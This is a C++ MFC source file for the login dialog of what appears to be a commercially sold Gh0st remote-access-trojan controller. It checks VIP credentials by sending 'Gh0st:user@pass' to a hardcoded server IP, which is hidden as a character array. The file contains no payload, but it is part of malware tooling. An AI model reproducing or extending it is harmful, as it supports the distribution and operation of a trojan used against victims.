// LoginDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "LoginDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


/////////////////////////////////////////////////////////////////////////////
// CLoginDlg dialog





CLoginDlg::CLoginDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CLoginDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CLoginDlg)
	m_LoginUser = ((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Login"), _T("User"), _T("请联系购买使用"));
 //   m_LoginPass = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("Login"), _T("Pass"), _T(""));  不自动输入密码  、还有下面一个
	//}}AFX_DATA_INIT
}


void CLoginDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CLoginDlg)
	DDX_Text(pDX, IDC_LOGIN_USER, m_LoginUser);
	DDX_Text(pDX, IDC_LOGIN_PASS, m_LoginPass);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CLoginDlg, CDialog)
	//{{AFX_MSG_MAP(CLoginDlg)
	ON_BN_CLICKED(IDC_LOGIN, OnLogin)
	ON_BN_CLICKED(IDC_EXIT_LOGIN, OnExitLogin)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CLoginDlg message handlers
BOOL CLoginDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CLoginDlg::OnLogin() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	CString strUser,strPass;
	GetDlgItem(IDC_LOGIN_USER)->GetWindowText(strUser);
	GetDlgItem(IDC_LOGIN_PASS)->GetWindowText(strPass);

	if (strUser.IsEmpty()||strPass.IsEmpty())
	{
		MessageBox(_T("账号密码为空"));
		return;
	}

	WSADATA wsaData = {0};
	WSAStartup(MAKEWORD(2,2), &wsaData);
	
	DWORD dwRecvSize = 0;
	SOCKET m_Socket;
	
	//创建Socket
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		MessageBox(_T("创建Socket失败"));
		WSACleanup();
		return;
	}
	
	// 连接服务器的IP跟端口
	hostent* pHostent = NULL;
	char YJQMo[] = {'1','0','3','.','1','1','9','.','1','.','1','3','9','\0'};
    pHostent = gethostbyname(_T(YJQMo));// 连接的IP
	
	if (pHostent == NULL)
	{
		return;
	}
	
	sockaddr_in	ServerAddr;
	ServerAddr.sin_family	= AF_INET;
	ServerAddr.sin_port	= htons(6617);// 连接的端口
	ServerAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	// 连接服务器
	if (connect(m_Socket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr)) == SOCKET_ERROR) 
	{
		MessageBox(_T("连接服务器失败"));
		return;
	}
	
	// 发送账号密码信息 进行验证
	char szInfo[256] = {0}, buff[256] = {0};
	wsprintf(szInfo, _T("Gh0st:%s@%s"),strUser,strPass);
	
	if( send(m_Socket, szInfo, sizeof(szInfo), 0) == SOCKET_ERROR )
	{
		MessageBox(_T("发送数据失败"));
		WSACleanup();
		return;
	}

	int Ret = recv(m_Socket, buff, sizeof(buff), NULL );
	if ( Ret == 0 || Ret == SOCKET_ERROR )
	{
		MessageBox("账号错误");
		closesocket(m_Socket);
		WSACleanup();
		return;
	}
	
	if (strstr( buff, "Pass" ) != NULL)//通过验证
	{
		closesocket(m_Socket);
		WSACleanup();
		((CClientApp *)AfxGetApp())->m_IniFile.SetString(_T("Login"), _T("User"), strUser);
	//	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Login"), _T("Pass"), strPass);  不保存密码  /还有上面有一个
    	((CClientApp *)AfxGetApp())->m_IniFile.SetString(_T("Login"), _T("Pass=防止Vip帐号在服务器上面被他人盗用，以后的Vip工具不在保存密码."), 1);  
		dwLoginCount = GetTickCount();
		CString str;
		str.Format(_T("%s"),buff+6);
		AfxMessageBox(str);
		OnExitLogin();
	}	
}

void CLoginDlg::OnExitLogin() 
{
	// TODO: Add your control notification handler code here
	HWND King = ::FindWindow(NULL,_T("阿拉贡VIP商业登录验证系统"));   //修改标题了 要修改这里
	::PostMessage(King,WM_CLOSE,1,0);
	OnCancel();
}

BOOL CLoginDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if(pMsg->message   ==   WM_KEYDOWN)   
	{   
		switch(pMsg->wParam)   
		{   
		case   VK_RETURN://屏蔽回车        
			return   TRUE;   
		case   VK_ESCAPE://屏蔽Esc   
			return   TRUE;   
		}   
	}  	
	return CDialog::PreTranslateMessage(pMsg);
}
